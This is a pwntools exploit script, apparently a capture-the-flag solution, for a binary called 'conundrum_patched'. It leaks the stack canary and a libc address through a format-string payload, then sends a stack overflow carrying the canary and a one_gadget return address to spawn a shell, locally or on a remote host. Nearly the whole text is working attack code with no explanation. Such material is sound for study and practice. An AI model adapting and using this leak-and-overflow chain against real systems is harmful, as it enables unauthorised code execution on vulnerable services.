#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'conundrum_patched')
elf = exe
filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# ➜  Conundrum checksec conundrum_patched 
# [*] '/home/mark/Desktop/BinExp/Challs/Conundrum/conundrum_patched'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'
# ➜  Conundrum

def leak():
    payload = '%23$p.%29$p'
    io.recvuntil('honestly):')
    io.sendline('2')
    io.recvuntil('pointers:')
    io.sendline(payload)
    leak = io.recvline().split(b'.')
    canary = int(leak[0][1::], 16)
    libc.address = int(leak[1], 16) - (0x7f7238621c87 - 0x7f7238600000)
    info("Canary: %#x", canary)
    info("Libc base: %#x", libc.address)

    return canary

def rop(canary):
    offset = 136
    one_gadget = libc.address + 0x4f2a5

    payload = flat({
        offset: [
            canary,
            b'A'*8,
            one_gadget
        ]
    })

    io.sendline('y')
    io.recvuntil('pointers:')
    io.sendline(payload)
    

if __name__ == '__main__':
    io = start()
    libc = ELF("./libc.so.6")

    canary = leak()
    rop(canary)

    io.interactive()
